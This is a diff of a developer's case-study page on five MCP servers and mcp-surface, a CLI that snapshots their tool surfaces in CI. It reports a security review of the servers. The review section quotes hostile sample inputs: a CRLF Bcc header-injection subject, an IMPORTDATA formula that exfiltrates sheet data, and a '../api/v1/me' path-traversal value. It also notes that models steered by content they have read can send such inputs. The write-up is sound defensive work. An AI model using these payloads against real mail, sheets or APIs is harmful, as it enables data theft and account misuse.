@@ -1,198 +1,178 @@
 ---
 layout: default
-title: MCP Servers and mcp-surface
+title: MCP servers, and the tool that checks them
 description: >-
-  Five Model Context Protocol servers — 69 tools across five auth models — and
-  mcp-surface, the published CLI that checks what each one exposes and gates
-  every server's CI on a committed snapshot of its tool surface.
+  Five Model Context Protocol servers with 69 tools between them, and
+  mcp-surface, the command-line tool each of them runs in CI.
 permalink: /mcp/
-extra_css: /assets/css/mcp.css
 ---
-<article class="mcp-page">
+<article class="post case-study">
+  <p class="post-back"><a href="{{ '/#projects' | relative_url }}">&larr; Brett Adams</a></p>
+  <p class="eyebrow">Case study · October 2026</p>
+  <h1>Five MCP servers, and the tool that checks them</h1>
+  <p class="case-facts">5 servers · 69 tools · 5 auth models · 160 offline tests</p>
 
-  <div class="mcp-hero" data-aos="fade-in">
-    <p class="mcp-eyebrow">Case study · Model Context Protocol</p>
-    <h1 class="main-font">Five MCP servers, <span class="mcp-accent">and the tool that checks them</span></h1>
-    <p class="mcp-lede">
-      I build <a href="https://modelcontextprotocol.io" target="_blank" rel="noopener">Model Context Protocol</a>
-      servers that let an AI assistant act on real accounts — send email, write a spreadsheet, post to Reddit,
-      read a fantasy league — and a published CLI, <a href="https://www.npmjs.com/package/mcp-surface" target="_blank" rel="noopener"><code>mcp-surface</code></a>,
-      that connects to a server the way a client does and reports what it actually exposes. Every server's CI
-      runs it against a committed snapshot, so the tools a model sees can only change through a reviewed diff.
-    </p>
-    <div class="mcp-cta">
-      <a href="https://github.com/brettadams0/mcp-surface" class="btn-blue" target="_blank" rel="noopener"><svg class="icon" aria-hidden="true" focusable="false"><use href="#fa-github"></use></svg> mcp-surface</a>
-      <a href="https://www.npmjs.com/package/mcp-surface" class="btn-blue-outline" target="_blank" rel="noopener"><svg class="icon" aria-hidden="true" focusable="false"><use href="#fa-file-download"></use></svg> npm</a>
-    </div>
-  </div>
-
-  <section id="mcp-numbers" class="mcp-stats" aria-label="At a glance">
-    <div class="mcp-stat"><span class="mcp-stat-value">5</span><span class="mcp-stat-label">servers</span></div>
-    <div class="mcp-stat"><span class="mcp-stat-value">69</span><span class="mcp-stat-label">tools</span></div>
-    <div class="mcp-stat"><span class="mcp-stat-value">5</span><span class="mcp-stat-label">auth models</span></div>
-    <div class="mcp-stat"><span class="mcp-stat-value">160</span><span class="mcp-stat-label">offline tests</span></div>
-    <div class="mcp-stat"><span class="mcp-stat-value">1</span><span class="mcp-stat-label">package on npm</span></div>
-  </section>
-
-  <section id="mcp-gate" class="mcp-section">
-    <h2 class="main-font">One gate for every server</h2>
+  <div class="post-body">
     <p>
-      A broken MCP server rarely looks broken. It starts, it completes the handshake, the client prints
-      <b>Connected</b> — and the model quietly gets a worse tool, or none. Unit tests don't catch it either,
-      because they assert on handlers, not on the surface a client is actually shown. So every server's CI
-      ends with the same step:
+      I've built five <a href="https://modelcontextprotocol.io">Model Context Protocol</a> servers. They
+      let an AI assistant work with real accounts: send email, edit a calendar, write to a spreadsheet,
+      post to Reddit, read a fantasy league. I also built
+      <a href="https://github.com/brettadams0/mcp-surface">mcp-surface</a>, a command-line tool that
+      connects to an MCP server the way a client does and reports what it actually exposes.
+    </p>
+    <p>
+      This page covers how the two fit together, and what a security and correctness review of all five
+      servers found in October 2026.
     </p>
 
-    <ol class="mcp-flow">
-      <li><span class="mcp-flow-step">1</span><b>Start</b> the real server over stdio, exactly as a client launches it — no credentials needed to list tools.</li>
-      <li><span class="mcp-flow-step">2</span><b>Read</b> <code>initialize</code> and <code>tools/list</code> raw, so one malformed tool is reported by name instead of failing the whole list.</li>
-      <li><span class="mcp-flow-step">3</span><b>Check</b> every schema, name and annotation, and hold the definitions to a size budget — they are resent on every request.</li>
-      <li><span class="mcp-flow-step">4</span><b>Diff</b> against the committed <code>mcp-surface.json</code>. Any change fails the build until the snapshot is updated in the same pull request.</li>
+    <h2>One check in every server's CI</h2>
+    <p>
+      A broken MCP server usually doesn't look broken. It starts, finishes the handshake and shows as
+      connected, while the model gets a worse tool or none at all. Unit tests miss this, because they test
+      the code behind each tool, not the list of tools a client is shown. So the last step in every
+      server's CI runs mcp-surface:
+    </p>
+    <ol>
+      <li>Start the server the way a client would. Listing tools needs no credentials.</li>
+      <li>Read the tool list and check every schema, name and annotation.</li>
+      <li>Compare the result with <code>mcp-surface.json</code>, a snapshot committed to the repository.</li>
     </ol>
+    <p>
+      Any change to a tool's name, description, inputs or annotations fails the build until the snapshot
+      is updated in the same pull request, which turns every such change into a diff someone has to review.
+    </p>
+    <figure>
+<pre><code>$ npm run surface
 
-    <figure class="mcp-terminal">
-      <div class="mcp-terminal-bar" aria-hidden="true"><span></span><span></span><span></span></div>
-<pre><code><span class="t-dim">$</span> npm run surface
-
-<span class="t-bold">google-workspace</span> <span class="t-dim">2.0.0 (279ms)</span>
-<span class="t-dim">23 tools · 0 resources · 0 prompts · capabilities: tools</span>
-<span class="t-dim">  ⋮</span>
-<span class="t-bold">Snapshot</span> mcp-surface.json
-  <span class="t-amber">~</span> tool calendar_create_event: description, inputSchema changed
-  <span class="t-amber">~</span> tool calendar_delete_event: description, inputSchema changed
-  <span class="t-amber">~</span> tool calendar_list_events: inputSchema changed
-  <span class="t-amber">~</span> tool calendar_update_event: description, inputSchema changed
-  <span class="t-amber">~</span> tool sheets_write_range: inputSchema changed
-<span class="t-dim">  ⋮</span>
-  <span class="t-dim">Run with --update-snapshot if these changes are intended.</span></code></pre>
-      <figcaption>Real output, trimmed where marked: the Google server after the fixes described below, checked against the surface recorded before them. Each intended change is a line to review.</figcaption>
+google-workspace 2.0.0 (279ms)
+23 tools · 0 resources · 0 prompts · capabilities: tools
+  ⋮
+Snapshot mcp-surface.json
+  ~ tool calendar_create_event: description, inputSchema changed
+  ~ tool calendar_delete_event: description, inputSchema changed
+  ~ tool calendar_list_events: inputSchema changed
+  ~ tool calendar_update_event: description, inputSchema changed
+  ~ tool sheets_write_range: inputSchema changed
+  ⋮
+  Run with --update-snapshot if these changes are intended.</code></pre>
+      <figcaption>Real output, shortened where marked: the Google server after the fixes below, compared with the snapshot taken before them.</figcaption>
     </figure>
-
     <p>
-      It earned its place on the first day. Upgrading the schema library from Zod 3 to Zod 4 looked like a routine
-      dependency bump; every test still passed. <code>mcp-surface</code> flagged all 23 Google tools as changed: the
-      new version stopped emitting <code>additionalProperties: false</code> and added a 120-byte email regex to every
-      address field, pushing the server over its definition budget. The upgrade was backed out before it shipped.
-    </p>
-  </section>
-
-  <section id="mcp-servers" class="mcp-section">
-    <h2 class="main-font">The servers</h2>
-    <p>Five upstream APIs, chosen partly because each one authenticates differently.</p>
-
-    <div class="mcp-grid">
-      <div class="mcp-card">
-        <div class="mcp-card-head"><h3 class="mono-font">google-workspace-mcp</h3><span class="mcp-tag mcp-tag-write">read + write</span></div>
-        <p class="mcp-meta">23 tools · Gmail, Calendar, Drive, Sheets, YouTube</p>
-        <p><b>Auth:</b> a self-owned Google OAuth client, deliberately requesting only write scopes to stay out of Google's paid restricted-scope audit. PKCE, <code>state</code>, loopback-only callback.</p>
-        <a href="https://github.com/brettadams0/google-workspace-mcp" class="mcp-card-link" target="_blank" rel="noopener"><svg class="icon" aria-hidden="true" focusable="false"><use href="#fa-github"></use></svg> Code</a>
-      </div>
-      <div class="mcp-card">
-        <div class="mcp-card-head"><h3 class="mono-font">reddit-mcp</h3><span class="mcp-tag mcp-tag-write">read + write</span></div>
-        <p class="mcp-meta">12 tools · posts, comments, votes, messages</p>
-        <p><b>Auth:</b> OAuth2 with a refresh token Reddit never rotates. Writes post publicly under a real account, so ids are type-checked and rejections are surfaced, never assumed away.</p>
-        <a href="https://github.com/brettadams0/reddit-mcp" class="mcp-card-link" target="_blank" rel="noopener"><svg class="icon" aria-hidden="true" focusable="false"><use href="#fa-github"></use></svg> Code</a>
-      </div>
-      <div class="mcp-card">
-        <div class="mcp-card-head"><h3 class="mono-font">supercell-mcp</h3><span class="mcp-tag">read-only</span></div>
-        <p class="mcp-meta">15 tools · Clash of Clans, Clash Royale, Brawl Stars</p>
-        <p><b>Auth:</b> static API keys, each bound to a single public IP. A 403 says which IP Supercell saw — the exact value the developer portal asks for.</p>
-        <a href="https://github.com/brettadams0/supercell-mcp" class="mcp-card-link" target="_blank" rel="noopener"><svg class="icon" aria-hidden="true" focusable="false"><use href="#fa-github"></use></svg> Code</a>
-      </div>
-      <div class="mcp-card">
-        <div class="mcp-card-head"><h3 class="mono-font">yahoo-fantasy-mcp</h3><span class="mcp-tag">read-only</span></div>
-        <p class="mcp-meta">10 tools · leagues, rosters, matchups</p>
-        <p><b>Auth:</b> OAuth2 with a refresh token Yahoo rotates on every use — which turns parallel tool calls into a race, and is why refresh is single-flight.</p>
-        <a href="https://github.com/brettadams0/yahoo-fantasy-mcp" class="mcp-card-link" target="_blank" rel="noopener"><svg class="icon" aria-hidden="true" focusable="false"><use href="#fa-github"></use></svg> Code</a>
-      </div>
-      <div class="mcp-card">
-        <div class="mcp-card-head"><h3 class="mono-font">chesscom-mcp</h3><span class="mcp-tag">read-only</span></div>
-        <p class="mcp-meta">9 tools · profiles, ratings, games, clubs</p>
-        <p><b>Auth:</b> none — a public API. The interesting problem is size: a month of games for an active player is megabytes, so results are summarised by default.</p>
-        <a href="https://github.com/brettadams0/chesscom-mcp" class="mcp-card-link" target="_blank" rel="noopener"><svg class="icon" aria-hidden="true" focusable="false"><use href="#fa-github"></use></svg> Code</a>
-      </div>
-      <div class="mcp-card mcp-card-feature">
-        <div class="mcp-card-head"><h3 class="mono-font">mcp-surface</h3><span class="mcp-tag mcp-tag-npm">npm · Action</span></div>
-        <p class="mcp-meta">CLI · library · GitHub Action · TypeScript</p>
-        <p>Probes a server over stdio, Streamable HTTP or SSE; 19 checks; canonicalised snapshots; a <code>--call</code> mode that only invokes tools annotated read-only with no required arguments. Published with npm provenance.</p>
-        <a href="https://github.com/brettadams0/mcp-surface" class="mcp-card-link" target="_blank" rel="noopener"><svg class="icon" aria-hidden="true" focusable="false"><use href="#fa-github"></use></svg> Code</a>
-      </div>
-    </div>
-  </section>
-
-  <section id="mcp-findings" class="mcp-section">
-    <h2 class="main-font">What a hardening pass found</h2>
-    <p>
-      The premise of the pass: every tool argument is model output, and a model that has just read a web page or an
-      email can be steered by what it read. A server that sends mail and writes spreadsheets has to treat its inputs
-      the way a web server treats a form post. Each item below shipped with a test that builds the hostile input.
+      It caught something on the first day. Upgrading the schema library from Zod 3 to Zod 4 looked
+      routine, and every test still passed. mcp-surface reported that all 23 Google tools had changed:
+      Zod 4 stopped marking objects as closed to extra properties, and added a 120-byte pattern to every
+      email field, which pushed the server's tool definitions past their size budget. I kept Zod 3.
     </p>
 
-    <div class="mcp-findings">
-      <div class="mcp-finding">
-        <p class="mcp-finding-kind mcp-kind-security">Security · google-workspace-mcp</p>
-        <h3>Header injection through a subject line</h3>
-        <p>Subjects, addresses and filenames were written straight into the MIME message, so <code>Hi\r\nBcc: someone@example.com</code> added a recipient. Line breaks are now refused, and non-ASCII text is encoded per RFC 2047 and 2231.</p>
-      </div>
-      <div class="mcp-finding">
-        <p class="mcp-finding-kind mcp-kind-security">Security · google-workspace-mcp</p>
-        <h3>Formula injection into a spreadsheet</h3>
-        <p>Writes used <code>USER_ENTERED</code>, which evaluates <code>=IMPORTDATA("https://…"&amp;A1)</code> as a live formula able to send the sheet anywhere. Values are now written raw; formula parsing is an explicit opt-in.</p>
-      </div>
-      <div class="mcp-finding">
-        <p class="mcp-finding-kind mcp-kind-security">Security · reddit-mcp, yahoo-fantasy-mcp</p>
-        <h3>Path traversal, with the token attached</h3>
-        <p>URL resolution collapses <code>..</code>, so a subreddit named <code>../api/v1/me</code> reached a different endpoint carrying the account's bearer token. Segments are validated, and Yahoo's requests are checked after resolution, before the token is read.</p>
-      </div>
-      <div class="mcp-finding">
-        <p class="mcp-finding-kind">Correctness · reddit-mcp</p>
-        <h3>A 200 that means no</h3>
-        <p>Reddit reports a rejected post — misspelt subreddit, rate limit — as HTTP 200 with the reasons buried in the body, so the model could announce a post that never existed. Rejections are now errors that name Reddit's reasons.</p>
-      </div>
-      <div class="mcp-finding">
-        <p class="mcp-finding-kind">Correctness · yahoo-fantasy-mcp</p>
-        <h3>A token-rotation race</h3>
-        <p>Parallel calls at expiry each presented the same single-use refresh token; all but one failed, and the token left on disk could be the spent one. Refresh is single-flight, and a test drives four calls through an expiry.</p>
-      </div>
-      <div class="mcp-finding">
-        <p class="mcp-finding-kind">Correctness · google-workspace-mcp</p>
-        <h3>Invitations nobody received</h3>
-        <p>The Calendar API emails no one unless asked, so "invite Alice" produced an event Alice never heard about — while the tool's description said otherwise. Attendees are now notified by default, with an explicit opt-out.</p>
-      </div>
-      <div class="mcp-finding">
-        <p class="mcp-finding-kind">Correctness · supercell-mcp</p>
-        <h3>A credentials file nobody could create</h3>
-        <p>The Clash of Clans client read <code>coc.json</code> while the docs, the example file and the error message all said <code>clashofclans.json</code>. A test now ties each client's file to its tracked example.</p>
-      </div>
-      <div class="mcp-finding">
-        <p class="mcp-finding-kind mcp-kind-cost">Context cost · chesscom-mcp</p>
-        <h3>2.27 MB → 238 KB</h3>
-        <p>One titled player's month was 509 games and 2.27 MB of JSON, far past any client's output cap, so the model saw a fragment. Games are now summarised without move records by default, with a time-class filter and PGN on request.</p>
-      </div>
-      <div class="mcp-finding">
-        <p class="mcp-finding-kind mcp-kind-cost">Footprint · google-workspace-mcp</p>
-        <h3>282 MB → 45 MB</h3>
-        <p>The monolithic <code>googleapis</code> package bundles every Google API there is. Five per-API packages replaced it, and with them a dependency override that existed only to work around the old one.</p>
-      </div>
-    </div>
-  </section>
-
-  <section id="mcp-baseline" class="mcp-section">
-    <h2 class="main-font">The shared baseline</h2>
-    <p>Each repository meets the same bar, so none of them is the one that got skipped.</p>
-    <ul class="mcp-checklist">
-      <li><b>Offline tests</b> on Node 20, 22 and 24 — no network, no credentials, request-level assertions through recording stubs.</li>
-      <li><b>A committed tool surface</b> that CI holds the running server to, with a definition-size budget.</li>
-      <li><b>MCP annotations on every tool</b> — read-only, destructive, idempotent — so a client can auto-approve reads and prompt for writes.</li>
-      <li><b>Bounded failure</b>: 30-second timeouts, trimmed error bodies, and rate-limit errors that say when to retry.</li>
-      <li><b>Compact results</b>, because tool output is model context and indentation is pure token cost.</li>
-      <li><b>Zero open <code>npm audit</code> advisories</b> at release, ESLint, monthly Dependabot, a changelog and a security policy.</li>
+    <h2>The servers</h2>
+    <p>I picked these partly because each one handles authentication differently.</p>
+    <ul class="also">
+      <li>
+        <a class="also-name" href="https://github.com/brettadams0/google-workspace-mcp">google-workspace-mcp</a>
+        <span class="also-desc">23 tools for Gmail, Calendar, Drive, Sheets and YouTube. Uses my own Google OAuth client with write-only scopes, which keeps it out of Google's paid security review for restricted scopes.</span>
+      </li>
+      <li>
+        <a class="also-name" href="https://github.com/brettadams0/supercell-mcp">supercell-mcp</a>
+        <span class="also-desc">15 read-only tools for Clash of Clans, Clash Royale and Brawl Stars. Each API key only works from the IP address it was created for.</span>
+      </li>
+      <li>
+        <a class="also-name" href="https://github.com/brettadams0/reddit-mcp">reddit-mcp</a>
+        <span class="also-desc">12 tools, including posting, commenting, voting and private messages. OAuth with a refresh token that never changes.</span>
+      </li>
+      <li>
+        <a class="also-name" href="https://github.com/brettadams0/yahoo-fantasy-mcp">yahoo-fantasy-mcp</a>
+        <span class="also-desc">10 read-only tools for leagues, rosters and matchups. OAuth with a refresh token that Yahoo replaces every time it's used.</span>
+      </li>
+      <li>
+        <a class="also-name" href="https://github.com/brettadams0/chesscom-mcp">chesscom-mcp</a>
+        <span class="also-desc">9 read-only tools for profiles, ratings, games and clubs. No authentication.</span>
+      </li>
+      <li>
+        <a class="also-name" href="https://github.com/brettadams0/mcp-surface">mcp-surface</a>
+        <span class="also-desc">The checker. TypeScript, published on npm with build provenance, and also usable as a GitHub Action.</span>
+      </li>
     </ul>
-  </section>
 
-  <div class="mcp-more">
-    <p>The longer story of why <code>mcp-surface</code> exists is on the blog: <a href="/blog/2026/07/28/connected-is-not-a-health-check/">Connected Is Not a Health Check</a>.</p>
-    <a href="/index.html#projects" class="mcp-back">&larr; Back to all projects</a>
+    <h2>What the review found</h2>
+    <p>
+      The review started from one assumption: every tool argument is written by a model, and a model that
+      has just read a web page or an email can be steered by what it read. A server that sends email and
+      writes to spreadsheets has to treat its inputs the way a web server treats a form submission. Each
+      fix below shipped with a test that builds the bad input.
+    </p>
+
+    <h3>Header injection through an email subject</h3>
+    <p>
+      The Gmail tools wrote the subject, recipients and attachment names straight into the message
+      headers, so a subject of <code>Hi\r\nBcc: someone@example.com</code> added a hidden recipient. Line
+      breaks in those fields are now rejected, and non-ASCII text is encoded the way the email standards
+      require (RFC 2047 and 2231).
+    </p>
+
+    <h3>Formula injection into a spreadsheet</h3>
+    <p>
+      Sheet writes used Google's "as if typed" mode, so a value like
+      <code>=IMPORTDATA("https://…"&amp;A1)</code> became a live formula that could send the sheet's
+      contents to any address. Values are now written as plain text unless the caller asks for formulas.
+    </p>
+
+    <h3>Requests that escaped their API path</h3>
+    <p>
+      Reddit subreddit names and Yahoo league keys went into request URLs unchecked. URLs resolve
+      <code>..</code>, so a subreddit named <code>../api/v1/me</code> reached a different Reddit endpoint
+      with the account's access token attached. Each value is now validated, and Yahoo requests are
+      checked after the URL is resolved and before the token is read.
+    </p>
+
+    <h3>Reddit failures that looked like success</h3>
+    <p>
+      When Reddit rejects a post, for a misspelt subreddit or a rate limit, it still answers with HTTP 200
+      and puts the reasons in the body. The tool passed that through, so the assistant could report a post
+      that was never made. Those responses are now errors that include Reddit's reasons.
+    </p>
+
+    <h3>A race on Yahoo's refresh token</h3>
+    <p>
+      Yahoo issues a new refresh token every time one is used. When several tool calls hit an expired
+      token at once, each tried to refresh with the same token: one succeeded, the others failed, and the
+      saved token could be the one already used up. Concurrent calls now share a single refresh, and a test
+      runs four of them through an expiry.
+    </p>
+
+    <h3>Calendar invitations that were never sent</h3>
+    <p>
+      Google Calendar only emails attendees when the request asks it to, so "invite Alice" created an event
+      Alice never heard about, even though the tool's description said she would. Invitations, updates and
+      cancellations are now emailed by default, with an option to turn that off.
+    </p>
+
+    <h3>A key file the docs named wrongly</h3>
+    <p>
+      The Clash of Clans tools read their key from <code>coc.json</code>, while the README, the example
+      file and the error message all said <code>clashofclans.json</code>. Following the setup instructions
+      exactly left every Clash of Clans tool broken. A test now ties each game's key file to its example.
+    </p>
+
+    <h3>2.27 MB of chess games, cut to 238 KB</h3>
+    <p>
+      One titled player's month of games came back as 509 games and 2.27 MB of JSON, far more than an
+      assistant can read in one tool result, so it saw a fragment. Games are now summarised without their
+      move lists by default, with a filter by time control and the full record on request.
+    </p>
+
+    <h3>282 MB of dependencies, cut to 45 MB</h3>
+    <p>
+      The <code>googleapis</code> package bundles every Google API there is. Switching the Google server to
+      the five per-API packages it actually uses shrank its installed dependencies by more than 80%.
+    </p>
+
+    <h2>What every repository now has</h2>
+    <ul>
+      <li>Tests that run without network access or credentials, on Node 20, 22 and 24.</li>
+      <li>A committed tool snapshot that CI checks the running server against.</li>
+      <li>Read-only, destructive and idempotent annotations on every tool, so a client can approve reads automatically and ask before writes.</li>
+      <li>A 30-second timeout on every request, trimmed error messages, and rate-limit errors that say when to retry.</li>
+      <li>No open <code>npm audit</code> advisories at release, plus ESLint, Dependabot, a changelog and a security policy.</li>
+    </ul>
   </div>
-
 </article>
